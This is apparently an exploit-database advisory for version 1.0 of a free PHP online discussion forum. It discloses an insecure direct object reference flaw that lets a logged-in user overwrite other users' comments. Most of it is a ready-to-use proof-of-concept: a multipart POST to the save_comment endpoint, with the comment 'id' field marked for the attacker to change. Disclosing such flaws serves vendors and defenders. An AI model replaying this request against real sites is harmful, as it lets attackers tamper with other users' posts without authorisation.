# Exploit Title: Online-discussion-forum-site v1.0 - Insecure Direct Object Reference(IDOR)
## Date: 2/1/2024
## Vendor Homepage: https://www.sourcecodester.com/php/15337/online-discussion-forum-site-phpoop-free-source-code.html
## Tested on: Debian Linux, Apache, Mysql
## Vendor: oretnom23
## Version: v1.0
## Exploit Description:
## Online-discussion-forum-site v1.0 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to update comment that owned by other user(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /odfs/classes/Master.php?f=save_comment HTTP/1.1
...

------WebKitFormBoundaryxcXPeEOh2PoB2vYi
Content-Disposition: form-data; name="id"

7(CHANGE HERE)
------WebKitFormBoundaryxcXPeEOh2PoB2vYi
Content-Disposition: form-data; name="post_id"

2
------WebKitFormBoundaryxcXPeEOh2PoB2vYi
Content-Disposition: form-data; name="comment"

<p>iiiii user1</p>
------WebKitFormBoundaryxcXPeEOh2PoB2vYi
Content-Disposition: form-data; name="files"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryxcXPeEOh2PoB2vYi--
```